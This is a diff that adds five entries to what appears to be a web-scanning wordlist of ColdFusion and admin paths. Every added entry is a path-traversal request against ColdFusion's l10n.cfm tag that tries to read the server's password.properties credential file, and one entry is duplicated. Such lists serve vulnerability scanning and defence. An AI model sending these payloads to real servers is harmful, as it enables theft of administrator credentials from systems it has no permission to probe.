@@ -116,3 +116,8 @@
 /cfusion/database/smpolicy.mdb
 /a4j/
 /adminroles/
+/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fcoldfusion10%2Fcfusion%2Flib%2Fpassword.properties
+/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fcoldfusion%2Fcfusion%2Flib%2Fpassword.properties
+/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fcoldfusion10%2Fcfusion%2Flib%2Fpassword.properties
+/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CColdFusion10%5Clib%5Cpassword.properties
+/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp&attributes.file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fcoldfusion10%2Fcfusion%2Flib%2Fpassword.properties
